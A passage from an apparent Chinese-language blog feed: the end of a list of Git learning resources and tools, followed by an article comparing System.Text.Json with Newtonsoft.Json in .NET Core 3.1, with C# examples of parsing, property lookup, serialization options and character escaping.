<li><a href="https://github.com/alexkaratarakis/gitattributes" target="_blank" rel="noopener">gitattributes 模板</a> - .gitattributes 文件模板</li>
<li><a href="https://github.com/tiimgreen/github-cheat-sheet" target="_blank" rel="noopener">github-cheat-sheet</a> - git 命令简略图表</li>
</ul>
</li>
<li>Git 书<ul>
<li><a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">Git 官方推荐教程</a> - Scott Chacon 的 Git 书。</li>
</ul>
</li>
<li>Git 教程<ul>
<li><a href="https://github.com/geeeeeeeeek/git-recipes" target="_blank" rel="noopener">Git 中文教程</a></li>
<li><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener">廖雪峰的 Git 教程</a></li>
<li><a href="https://github.com/xirong/my-git" target="_blank" rel="noopener">有关 git 的学习资源</a></li>
</ul>
</li>
<li>文章<ul>
<li><a href="https://github.com/k88hudson/git-flight-rules/blob/master/README_zh-CN.md" target="_blank" rel="noopener">Git Cookbook</a></li>
<li><a href="https://github.com/521xueweihan/git-tips" target="_blank" rel="noopener">Git 奇技淫巧</a></li>
<li><a href="https://github.com/aseaday/git-style-guide" target="_blank" rel="noopener">Git 风格指南</a></li>
<li><a href="http://www.cnblogs.com/cnblogsfans/p/5075073.html" target="_blank" rel="noopener">Git 在团队中的最佳实践–如何正确使用 Git Flow</a></li>
</ul>
</li>
<li>Git 工具<ul>
<li><a href="https://git-scm.com/downloads/guis" target="_blank" rel="noopener">guis</a> - Git 官网展示的客户端工具列表。</li>
<li><a href="https://github.com/gogits/gogs" target="_blank" rel="noopener">gogs</a> - 极易搭建的自助 Git 服务。</li>
<li><a href="https://github.com/nvie/gitflow" target="_blank" rel="noopener">gitflow</a> - 应用 <a href="http://nvie.com/posts/a-successful-git-branching-model/" target="_blank" rel="noopener">fit-flow</a> 模型的工具。</li>
<li><a href="http://firstaidgit.io/" target="_blank" rel="noopener">firstaidgit.io</a> 一个可搜索的最常被问到的 Git 的问题</li>
<li><a href="https://github.com/unixorn/git-extra-commands" target="_blank" rel="noopener">git-extra-commands</a> - 一堆有用的额外的 Git 脚本</li>
<li><a href="https://github.com/tj/git-extras" target="_blank" rel="noopener">git-extras</a> - GIT 工具集 – repo summary, repl, changelog population, author commit percentages and more</li>
<li><a href="https://github.com/qw3rtman/git-fire" target="_blank" rel="noopener">git-fire</a> - git-fire 是一个 Git 插件，用于帮助在紧急情况下添加所有当前文件, 做提交(committing), 和推(push)到一个新分支(阻止合并冲突)。</li>
<li><a href="https://github.com/git-tips/tips" target="_blank" rel="noopener">git-tips</a> - Git 小提示</li>
<li><a href="https://github.com/Originate/git-town" target="_blank" rel="noopener">git-town</a> - 通用，高级 Git 工作流支持！ <a href="http://www.git-town.com" target="_blank" rel="noopener">http://www.git-town.com</a></li>
</ul>
</li>
<li>GUI 客户端(GUI Clients)<ul>
<li><a href="https://www.gitkraken.com/" target="_blank" rel="noopener">GitKraken</a> - 豪华的 Git 客户端 Windows, Mac &amp; Linux</li>
<li><a href="https://git-cola.github.io/" target="_blank" rel="noopener">git-cola</a> - 另外一个 Git 客户端 Windows &amp; OS X</li>
<li><a href="https://github.com/git-up/GitUp" target="_blank" rel="noopener">GitUp</a> - 一个新的 Git 客户端，在处理 Git 的复杂性上有自己的特点</li>
<li><a href="https://rowanj.github.io/gitx/" target="_blank" rel="noopener">gitx-dev</a> - 图形化的 Git 客户端 OS X</li>
<li><a href="https://www.sourcetreeapp.com/" target="_blank" rel="noopener">Source Tree</a> - 免费的图形化 Git 客户端 Windows &amp; OS X</li>
<li><a href="http://www.git-tower.com/" target="_blank" rel="noopener">Tower</a> - 图形化 Git 客户端 OS X(付费)</li>
</ul>
</li>
<li>git cheat sheet<ul>
<li><a href="https://services.github.com/on-demand/downloads/github-git-cheat-sheet.pdf" target="_blank" rel="noopener">github-git-cheat-sheet</a></li>
</ul>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[.NET Core 3.1 中的 Json 互操作最全解读]]></title>
      <url>/2019/12/30/UsingSystemTextJsonInNetCore31/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://mp.weixin.qq.com/s/OSPxIGiJ1rRw1Sz-kZqgvQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/OSPxIGiJ1rRw1Sz-kZqgvQ</a>  </p>
</blockquote>
<a id="more"></a>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;本文将会全面介绍 System.Text.Json 和 Newtonsoft.Json 的相同和异同之处，方便需要的同学做迁移使用。</p>
<h1 id="文档比较"><a href="#文档比较" class="headerlink" title="文档比较"></a>文档比较</h1><h2 id="几个重要的对象"><a href="#几个重要的对象" class="headerlink" title="几个重要的对象"></a>几个重要的对象</h2><p>&emsp;&emsp;在 System.Text.Json 中，有几个重量级的对象，所有的 JSON 互操作，都是围绕这几个对象进行，只要理解了他们各自的用途用法，就基本上掌握了 JSON 和实体对象的互操作。</p>
<h3 id="JsonDocument"><a href="#JsonDocument" class="headerlink" title="JsonDocument"></a>JsonDocument</h3><p>&emsp;&emsp;提供用于检查 JSON 值的结构内容，而不自动实例化数据值的机制。JsonDocument 有一个属性 RootElement，提供对JSON文档根元素的访问，RootElement 是一个 JsonElement 对象。</p>
<h3 id="JsonElement"><a href="#JsonElement" class="headerlink" title="JsonElement"></a>JsonElement</h3><p>&emsp;&emsp;提供对 JSON 值的访问，在 System.Text.Json 中，大到一个对象、数组，小到一个属性、值，都可以通过 JsonElement 进行互操作。</p>
<h3 id="JsonProperty"><a href="#JsonProperty" class="headerlink" title="JsonProperty"></a>JsonProperty</h3><p>&emsp;&emsp;JSON 中最小的单元，提供对属性、值的访问。</p>
<h3 id="JsonSerializer"><a href="#JsonSerializer" class="headerlink" title="JsonSerializer"></a>JsonSerializer</h3><p>&emsp;&emsp;提供 JSON 互操作的静态类，提供了一系列 Serializer / Deserialize 的互操作的方法，其中还有一些异步/流式操作方法。</p>
<h3 id="JsonSerializerOptions"><a href="#JsonSerializerOptions" class="headerlink" title="JsonSerializerOptions"></a>JsonSerializerOptions</h3><p>&emsp;&emsp;与上面的 JsonSerializer 配合使用，提供自定义的个性化互操作选项，包括命名、枚举转换、字符转义、注释规则、自定义转换器等等操作选项。</p>
<h3 id="Utf8JsonWriter-Utf8JsonReader"><a href="#Utf8JsonWriter-Utf8JsonReader" class="headerlink" title="Utf8JsonWriter / Utf8JsonReader"></a>Utf8JsonWriter / Utf8JsonReader</h3><p>&emsp;&emsp;这两个对象是整个 System.Text.Json 的核心对象，所有的JSON互操作几乎都是通过这两个对象进行，他们提供的高性能的底层读写操作。</p>
<h2 id="初始化一个简单的-JSON-对象"><a href="#初始化一个简单的-JSON-对象" class="headerlink" title="初始化一个简单的 JSON 对象"></a>初始化一个简单的 JSON 对象</h2><p>&emsp;&emsp;在 System.Text.Json 中，并未提供像 JToken 那样非常便捷的创建对象的操作，想要创建一个 JSON 对象，其过程是比较麻烦的，请看下面的代码，进行对比：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Newtonsoft.Json.Linq;</span></span><br><span class="line">JToken root = <span class="keyword">new</span> JObject();</span><br><span class="line">root[<span class="string">"Name"</span>] = <span class="string">"Ron"</span>;</span><br><span class="line">root[<span class="string">"Money"</span>] = <span class="number">4.5</span>;</span><br><span class="line">root[<span class="string">"Age"</span>] = <span class="number">30</span>;</span><br><span class="line"><span class="keyword">string</span> jsonText = root.ToString();</span><br><span class="line"></span><br><span class="line"><span class="comment">// System.Text.Json</span></span><br><span class="line"><span class="keyword">string</span> json = <span class="keyword">string</span>.Empty;</span><br><span class="line"><span class="keyword">using</span> (MemoryStream ms = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">using</span> (Utf8JsonWriter writer = <span class="keyword">new</span> Utf8JsonWriter(ms))</span><br><span class="line">    &#123;</span><br><span class="line">        writer.WriteStartObject();</span><br><span class="line">        writer.WriteString(<span class="string">"Name"</span>, <span class="string">"Ron"</span>);</span><br><span class="line">        writer.WriteNumber(<span class="string">"Money"</span>, <span class="number">4.5</span>);</span><br><span class="line">        writer.WriteNumber(<span class="string">"Age"</span>, <span class="number">30</span>);</span><br><span class="line">        writer.WriteEndObject();</span><br><span class="line">        writer.Flush();</span><br><span class="line">    &#125;</span><br><span class="line">    json = Encoding.UTF8.GetString(ms.ToArray());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;System.Text.Json 的操作便利性在这方面目前处于一个比较弱的状态，不过，从这里也可以看出，可能官方并不希望我们去直接操作 JSON 源，而是通过操作实体对象以达到操作 JSON 的目的，也可能对互操作是性能比较自信的表现吧。</p>
<h2 id="封装和加载"><a href="#封装和加载" class="headerlink" title="封装和加载"></a>封装和加载</h2><p>&emsp;&emsp;在对 JSON 文档进行包装的用法：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> json = <span class="string">"&#123;\"name\":\"Ron\",\"money\":4.5&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> jDoc = System.Text.Json.JsonDocument.Parse(json);</span><br><span class="line"><span class="keyword">var</span> jToken = Newtonsoft.Json.Linq.JToken.Parse(json);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我发现 MS 这帮人很喜欢使用 Document 这个词,包括 XmlDocument / XDocument 等等。</p>
<h2 id="查找元素（对象）"><a href="#查找元素（对象）" class="headerlink" title="查找元素（对象）"></a>查找元素（对象）</h2><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> json = <span class="string">"&#123;\"name\":\"Ron\",\"money\":4.5&#125;"</span>;</span><br><span class="line"><span class="keyword">var</span> jDoc = System.Text.Json.JsonDocument.Parse(json);</span><br><span class="line"><span class="keyword">var</span> obj = jDoc.RootElement[<span class="number">0</span>];<span class="comment">// 这里会报错，索引仅支持 Array 类型的JSON文档</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> jToken = Newtonsoft.Json.Linq.JToken.Parse(json);</span><br><span class="line"><span class="keyword">var</span> name = jToken[<span class="string">"name"</span>];</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;你看，到查找元素环节就体现出差异了，JsonDocuemnt 索引仅支持 Array 类型的JSON文档，而 JToken 则支持 object 类型的索引（充满想象），用户体验高下立判。那我们不禁要提问了，如何在 JsonDocument 中查找元素？答案如下：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> json = <span class="string">"&#123;\"name\":\"Ron\",\"money\":4.5&#125;"</span>;</span><br><span class="line"><span class="keyword">var</span> jDoc = System.Text.Json.JsonDocument.Parse(json);</span><br><span class="line"><span class="keyword">var</span> enumerate = jDoc.RootElement.EnumerateObject();</span><br><span class="line"><span class="keyword">while</span> (enumerate.MoveNext())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (enumerate.Current.Name == <span class="string">"name"</span>)</span><br><span class="line">        Console.WriteLine(<span class="string">"&#123;0&#125;:&#123;1&#125;"</span>, enumerate.Current.Name, enumerate.Current.Value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;从上面的代码来看，JsonElement 存在两个迭代器，分别是 EnumerateArray 和 EnumerateObject；通过迭代器，你可以实现查找元素的需求。你看，MS 关上了一扇门，然后又为了打开了一扇窗，还是很人性化的了。在 System.Text.Json 中，一切对象都是 Element，Object / Array / Property，都是 Element，这个概念和 XML 一致，但是和 Newtonsoft.Json 不同，这是需要注意的地方。<br>&emsp;&emsp;你也可以选择不迭代，直接获取对象的属性，比如使用下面的方法：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> json = <span class="string">"&#123;\"name\":\"Ron\",\"money\":4.5&#125;"</span>;</span><br><span class="line"><span class="keyword">var</span> jDoc = System.Text.Json.JsonDocument.Parse(json);</span><br><span class="line"><span class="keyword">var</span> age = jDoc.RootElement.GetProperty(<span class="string">"age"</span>);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面这段代码将抛出异常，因为属性 age 不存在，通常情况下，我们会立即想用一个 ContainsKey 来作一个判断，但是很可惜，JsonElement 并未提供该方法，而是提供了一个 TryGetProperty 方法；所以，除非你明确知道 json 对象中的属性，否则一般情况下，建议使用 TryGetProperty 进行取值。<br>&emsp;&emsp;就算是这样，使用 GetProperty / TryGetProperty 得到的值，还是一个 JsonElement 对象，并不是你期望的“值”。所以 JsonElement 很人性化的提供了各种 GetIntxx / GetString 方法，但是就算如此，还是可能产生意外，思考下面的代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> json = <span class="string">"&#123;\"name\":\"Ron\",\"money\":4.5,\"age\":null&#125;"</span>;</span><br><span class="line"><span class="keyword">var</span> jDoc = System.Text.Json.JsonDocument.Parse(json);</span><br><span class="line"><span class="keyword">var</span> property = jDoc.RootElement.GetProperty(<span class="string">"age"</span>);</span><br><span class="line"><span class="keyword">var</span> age = property.GetInt32();</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面的代码，最后一行将抛出异常，因为你尝试从一个 null 到 int32 的类型转换，怎么解决这种问题呢，又回到了 JsonElement 上面来，他又提供了一个对值进行检查的方法：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (property.ValueKind == JsonValueKind.Number)   </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> age = property.GetInt32();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这个时候，程序运行良好，JsonValueKind 枚举提供了一系列的类型标识，为了进一步缩小内存使用率，Json 团队用心良苦的将枚举值声明为：byte 类型（够抠）</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> JsonValueKind : <span class="keyword">byte</span></span><br><span class="line">&#123;</span><br><span class="line">    Undefined = <span class="number">0</span>,</span><br><span class="line">    Object = <span class="number">1</span>,</span><br><span class="line">    Array = <span class="number">2</span>,</span><br><span class="line">    String = <span class="number">3</span>,</span><br><span class="line">    Number = <span class="number">4</span>,</span><br><span class="line">    True = <span class="number">5</span>,</span><br><span class="line">    False = <span class="number">6</span>,</span><br><span class="line">    Null = <span class="number">7</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;看到这里，你是不是有点想念 Newtonsoft.Json 了呢？别着急，下面我给大家介绍一个宝贝 System.Json.dll。</p>
<h2 id="System-Json"><a href="#System-Json" class="headerlink" title="System.Json"></a>System.Json</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>&emsp;&emsp;System.Json 提供了对 JSON 对象序列化的基础支持，但是也是有限的支持，请看下图：</p>
<figure class="image-box">
                <img src="1.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;System.Json 目前已合并到 .NETCore-3.1 中，如果你希望使用他，需要单独引用：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-Package System.Json -Version <span class="number">4.7</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这个 JSON 互操作包提供了几个常用的操作类型，从下面的操作类不难看出，提供的支持是非常有限的，而且效率上也不好说。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">System.Json.JsonArray</span><br><span class="line">System.Json.JsonObject</span><br><span class="line">System.Json.JsonPrimitive</span><br><span class="line">System.Json.JsonValue</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;首先，JsonObject 是实现 IDictionary 接口，并在内部维护一个 SortedDictionary 字典，所以他具备字典类的一切操作，比如索引等等，JsonArray 就更简单，也是一样的实现 IList 接口，然后同样的在内部维护一个 List 链表，以实现数组功能，对象的序列化都是通过 JsonValue 进行操作，序列化的方式也是非常的简单，就是对对像进行迭代，唯一值得称道的地方是，采用了流式处理。</p>
<h4 id="使用-System-Json-操作上面的查找过程如下"><a href="#使用-System-Json-操作上面的查找过程如下" class="headerlink" title="使用 System.Json 操作上面的查找过程如下"></a>使用 System.Json 操作上面的查找过程如下</h4><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = System.Json.JsonObject.Parse(<span class="string">"&#123;\"name\":\"ron\"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span> (obj.ContainsKey(<span class="string">"age"</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> age = obj[<span class="string">"age"</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;令人遗憾的是，虽然 System.Json 已经合并到 .NETCore-3.1 的路线图中；但是，System.Text.Json 不提供对 System.Json 的互操作性，我们期待以后 System.Text.Json 也能提供 System.Json 的操作便利性。</p>
<h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><p>&emsp;&emsp;基本知识已经介绍完成，下面我们进入 System.Text.Json 的内部世界一探究竟。</p>
<h3 id="互操作"><a href="#互操作" class="headerlink" title="互操作"></a>互操作</h3><p>&emsp;&emsp;思考下面的代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 序列化</span></span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> UserInfo &#123; Name = <span class="string">"Ron"</span>, Money = <span class="number">4.5</span>m, Age = <span class="number">30</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> json = JsonSerializer.Serialize(user);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">&#123;<span class="string">"Name"</span>:<span class="string">"Ron"</span>,<span class="string">"Money"</span>:<span class="number">4.5</span>,<span class="string">"Age"</span>:<span class="number">30</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line">user = JsonSerializer.Deserialize&lt;UserInfo&gt;(json);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;目前为止，上面的代码工作良好。让我们对上面的代码稍作修改，将 JSON 字符串进行一个转小写的操作后再进行反序列化的操作：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 输出</span></span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Ron"</span>,<span class="string">"money"</span>:<span class="number">4.5</span>,<span class="string">"age"</span>:<span class="number">30</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line">user = JsonSerializer.Deserialize&lt;UserInfo&gt;(json);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面的代码可以正常运行，也不会抛出异常，你可以得到一个完整的 user 对象；但是，user 对象的属性值将会丢失！这是因为 System.Text.Json 默认采用的是区分大小写匹配的方式，为了解决这个问题，我们需要引入序列化操作个性化设置，请参考下面的代码，启用忽略大小写的设置：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 输出</span></span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Ron"</span>,<span class="string">"money"</span>:<span class="number">4.5</span>,<span class="string">"age"</span>:<span class="number">30</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = <span class="keyword">new</span> JsonSerializerOptions()   </span><br><span class="line">&#123;</span><br><span class="line">    PropertyNameCaseInsensitive = <span class="literal">true</span>   </span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line">user = JsonSerializer.Deserialize&lt;UserInfo&gt;(json,options);</span><br></pre></td></tr></table></figure>

<h3 id="格式化-JSON"><a href="#格式化-JSON" class="headerlink" title="格式化 JSON"></a>格式化 JSON</h3><p>&emsp;&emsp;现在你可以选择对序列化的 JSON 文本进行美化，而不是输出上面的压缩后的 JSON 文本，为了实现美化的效果，你仅仅需要在序列化的时候加入一个 WriteIndented 设置：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> options = <span class="keyword">new</span> JsonSerializerOptions();</span><br><span class="line">options.WriteIndented = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> UserInfo &#123; Name = <span class="string">"Ron"</span>, Money = <span class="number">4.5</span>m, Age = <span class="number">30</span>, Remark = <span class="string">"你好，欢迎！"</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> json = JsonSerializer.Serialize(user, options);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"Name"</span>: <span class="string">"Ron"</span>,</span><br><span class="line">  <span class="string">"Money"</span>: <span class="number">4.5</span>,</span><br><span class="line">  <span class="string">"Age"</span>: <span class="number">30</span>,</span><br><span class="line">  <span class="string">"Remark"</span>: <span class="string">"\u4F60\u597D\uFF0C\u6B22\u8FCE\uFF01"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;你看，就是这么简单，但是你也发现了，上面的 Remark 属性在序列化后，中文被转义了，这就是接下来要解决的问题。</p>
<h3 id="字符转义的问题"><a href="#字符转义的问题" class="headerlink" title="字符转义的问题"></a>字符转义的问题</h3><p>&emsp;&emsp;在默认情况下，System.Text.Json 序列化程序对所有非 ASCII 字符进行转义；这就是中文被转义的根本原因。但是在内部，他又允许你自定义控制字符集的转义行为，这个设置就是：Encoder，比如下面的代码，对中文进行转义的例外设置，需要创建一个 TextEncoderSettings 对象，并将 UnicodeRanges.All 加入允许例外范围内，并使用 JavaScriptEncoder 根据 TextEncoderSettings 创建一个 JavaScriptEncoder 对象即可。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> encoderSettings = <span class="keyword">new</span> TextEncoderSettings();</span><br><span class="line">encoderSettings.AllowRanges(UnicodeRanges.All);</span><br><span class="line"><span class="keyword">var</span> options = <span class="keyword">new</span> JsonSerializerOptions();</span><br><span class="line">options.Encoder = JavaScriptEncoder.Create(encoderSettings);</span><br><span class="line">options.WriteIndented = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> UserInfo &#123; Name = <span class="string">"Ron"</span>, Money = <span class="number">4.5</span>m, Age = <span class="number">30</span>, Remark = <span class="string">"你好，欢迎！"</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> json = JsonSerializer.Serialize(user, options);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"Name"</span>: <span class="string">"Ron"</span>,</span><br><span class="line">  <span class="string">"Money"</span>: <span class="number">4.5</span>,</span><br><span class="line">  <span class="string">"Age"</span>: <span class="number">30</span>,</span><br><span class="line">  <span class="string">"Remark"</span>: <span class="string">"你好，欢迎！"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;还有另外一种模式，可以不必设置例外而达到不转义的效果，这个模式就是 “非严格 JSON” 模式，将上面的 JavaScriptEncoder.Create(encoderSettings) 替换为下面的代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">options.Encoder = JavaScriptEncoder.UnsafeRelaxedJsonEscaping;</span><br></pre></td></tr></table></figure>

<h3 id="序列化相关-异步-流式"><a href="#序列化相关-异步-流式" class="headerlink" title="序列化相关 - 异步/流式"></a>序列化相关 - 异步/流式</h3><p>&emsp;&emsp;System.Text.Josn 提供了一系列丰富的 JSON 互操作，这其中包含异步和流式处理，这点也是和 Newtonsoft.Json 最大的不同，但不管是那种方式，都要牢记，最后都是通过下面的两个类来实现：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.Text.Json.Utf8JsonReader</span><br><span class="line">System.Text.Json.Utf8JsonWriter</span><br></pre></td></tr></table></figure>

<h3 id="自定义-JSON-名称和值"><a href="#自定义-JSON-名称和值" class="headerlink" title="自定义 JSON 名称和值"></a>自定义 JSON 名称和值</h3><p>&emsp;&emsp;在默认情况下，输出的 JSON 属性名称保持和实体对象相同，包括大小写的都是一致的，枚举类型在默认情况下被序列化为数值类型。System.Text.JSON 提供了一系列的设置和扩展来帮助开发者实现各种自定义的需求。下面的代码可以设置默认的 JSON 属性名称，这个设置和 Newtonsoft.Json 基本一致。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UserInfo</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">JsonPropertyName(<span class="meta-string">"name"</span>)</span>] <span class="keyword">public</span> <span class="keyword">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">decimal</span> Money &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Remark &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;UserInfo 的 属性 Name 在输出为 JSON 的时候，其字段名称将为：name，其他属性保持大小写不变。</p>
